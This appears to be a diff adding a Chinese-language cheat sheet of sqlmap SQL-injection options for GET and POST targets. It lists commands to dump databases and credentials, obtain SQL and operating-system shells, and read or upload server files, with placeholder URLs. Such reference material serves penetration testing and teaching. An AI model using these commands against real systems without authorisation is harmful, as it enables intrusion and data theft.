@@ -1,0 +1,34 @@
+get型常用参数 :
+    -u：指定注入的URL   sqlmap -u URL
+    --dbs：爆出所有数据库 sqlmap -u URL --dbs
+    --dbms：指定数据库类型 sqlmap -u URL --dbms=mysql
+    --users：查看数据库的所有用户 sqlmap -u URL --users
+    --current-user：查看数据库当前用户 sqlmap -u URL --current-user
+    --current-db：查看网站当前数据库 sqlmap -u URL --current-db
+    --is-dba：判断当前用户是否有管理员权限 sqlmap -u URL --is-dba
+        [11:57:52] [INFO] testing if current user is DBA
+        [11:57:52] [INFO] fetching current user
+        current user is DBA: True
+    --roles：列出数据库所有管理员角色，仅适用于oracle数据库 sqlmap -u URL --roles
+    --tables：爆出所有数据表 sqlmap -u URL -D 数据库名 --tables
+    --columns：爆出数据库表所有列 sqlmap -u URL -D 数据库名 -T 表名 --columns 
+    --dump：爆出数据库中列中的所有数据 sqlmap -u URL -D 数据库名 -T 表名 -C 列名 --dump
+    --dump-all：爆出数据库中所有的数据 sqlmap -u URL -D 数据库名 -T 表名 --dump-all
+    --sql-shell：获取数据库shell  sqlmap -u URL --sql-shell
+    --os-shell：获取服务器shell  sqlmap -u URL --os-shell
+    --file-read：读取服务器文件  sqlmap -u URL --file-read "文件路径及名称"
+    --file-write 本地文件 --file-dist 目标文件路径及名称：将本地文件上传至目标服务器
+    --time-sec=2：延时注入 sqlmap -u URL --time-sec=2
+    --batch：探测过程中不进行询问，一律选择默认
+    -m：如果有多个url地址，可以把多个url保存成一个文本文件，-m可以加载文本文件逐个扫描
+
+post型常用参数 :
+    -r：指定POST数据文件  sqlmap -r post.txt
+    --data：这种不需要将数据进行保存，只需要将post数据复制下来即可 sqlmap -u URL --data="post数据"
+    --forms：自动搜索表单的方式 sqlmap -u URL --forms
+    --cookie="抓取的cookie"：测试cookie字段
+    --param-del：参数拆分字符，当GET型或POST型需要用其他字符分割测试参数的时候需要用到此参数，sqlmap -r post.txt --data="query=foorbar;id=1" --param-del
+    --referer：在请求中伪造http中的referer，当level参数设定为3或者3以上的时候会尝试对referer注入
+    --headers：增加额外的http头
+    --proxy：指定代理地址
+    -p：指定测试参数
